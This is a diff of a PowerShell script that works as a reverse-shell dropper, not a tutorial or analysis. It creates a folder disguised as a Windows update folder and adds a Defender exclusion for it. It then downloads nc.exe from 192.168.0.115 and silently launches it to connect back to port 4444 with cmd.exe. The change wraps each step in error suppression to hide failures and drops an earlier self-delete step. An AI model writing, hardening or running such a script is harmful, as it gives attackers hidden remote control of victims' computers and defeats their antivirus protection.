@@ -1,24 +1,30 @@
+# Set global error action to silently continue
+$ErrorActionPreference = 'SilentlyContinue'
+
 # Define temporary folder and executable name
 $TempDir = "$env:TEMP\WinUpdateTemp"
 $NcPath = "$TempDir\nc.exe"
 
-# Create the temp folder
-New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
+# Create the temp folder (ignore if exists)
+try {
+    New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
+} catch {}
 
-# Exclude the folder from Defender
-Add-MpPreference -ExclusionPath $TempDir
+# Try to exclude the folder from Windows Defender
+try {
+    Add-MpPreference -ExclusionPath $TempDir
+} catch {}
 
-# Download nc.exe from your server
-Invoke-WebRequest -Uri "http://192.168.0.115/nc.exe" -OutFile $NcPath
+# Try downloading nc.exe
+try {
+    Invoke-WebRequest -Uri "http://192.168.0.115/nc.exe" -OutFile $NcPath
+} catch {}
 
-# Run nc.exe silently to connect to listener
-$WshShell = New-Object -ComObject WScript.Shell
-$WshShell.Run("`"$NcPath`" 192.168.0.115 4444 -e cmd.exe", 0, $false)
+# Try running nc.exe silently to connect to listener
+try {
+    $WshShell = New-Object -ComObject WScript.Shell
+    $WshShell.Run("`"$NcPath`" 192.168.0.115 4444 -e cmd.exe", 0, $false)
+} catch {}
 
-# Optional: Wait to ensure reverse shell runs
+# Optional sleep to give time for reverse shell
 Start-Sleep -Seconds 5
-
-# Self-delete script
-$MyPath = $MyInvocation.MyCommand.Definition
-Start-Sleep -Milliseconds 500
-Remove-Item -Path $MyPath -Force
